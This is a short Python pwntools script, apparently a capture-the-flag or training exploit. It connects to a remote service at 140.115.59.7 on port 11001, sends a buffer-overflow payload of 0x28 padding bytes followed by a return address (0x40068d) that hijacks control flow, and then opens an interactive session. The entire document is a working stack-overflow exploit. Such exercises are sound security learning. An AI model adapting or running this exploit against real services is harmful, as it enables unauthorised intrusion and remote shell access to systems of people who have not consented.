#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "140.115.59.7"
port = 11001
yuan = remote(host,port)

ad = 0x40068d
p = ''
p += 'f'*0x28 + p64(ad)
yuan.sendline(p)
yuan.interactive()
